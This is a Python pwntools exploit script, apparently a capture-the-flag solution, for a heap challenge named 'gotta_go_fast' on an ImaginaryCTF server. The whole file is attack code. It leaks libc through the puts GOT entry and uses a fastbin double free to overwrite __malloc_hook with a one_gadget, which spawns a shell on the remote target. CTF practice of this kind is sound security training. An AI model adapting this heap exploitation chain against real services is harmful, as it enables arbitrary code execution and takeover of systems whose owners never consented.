from pwn import *
#p = process('./gotta_go_fast')
p = remote('chal.imaginaryctf.org', 42009)
elf = ELF('./gotta_go_fast')
libc = ELF('libc6_2.23-0ubuntu11.2_amd64.so')
#raw_input("DEBUG")

def add(data):
	p.sendlineafter('> ', '0')
	p.sendlineafter('> ', '1')
	p.sendlineafter('> ', '1')
	p.sendlineafter('name?\n', str(data))
	print "Add..."

def free(idx):
	p.sendlineafter('> ', '1')
	p.sendlineafter('> ', str(idx))
	print "Free..."


p.recv()
p.sendline('4')
p.recv()
p.sendline(str(elf.symbols['got.puts']))

#p.recvuntil('\n')
puts = int(p.recv(14),16)
print "puts: ",hex(puts)
base = puts - libc.symbols['puts']
print "Base: ",hex(base)
# 0x45226 0x4527a 0xf0364 0xf1207
one = base + 0xf0364
print "One: ",hex(one)
malloc = base + libc.symbols['__malloc_hook']
print "Malloc: ",hex(malloc)


add(b'a')
add(b'b')

free(1)
free(0)
free(1)

add(p64(malloc - 0x23))
add("c")
add("d")
add("z"*0x13 + p64(one))

p.sendline("0")


p.interactive()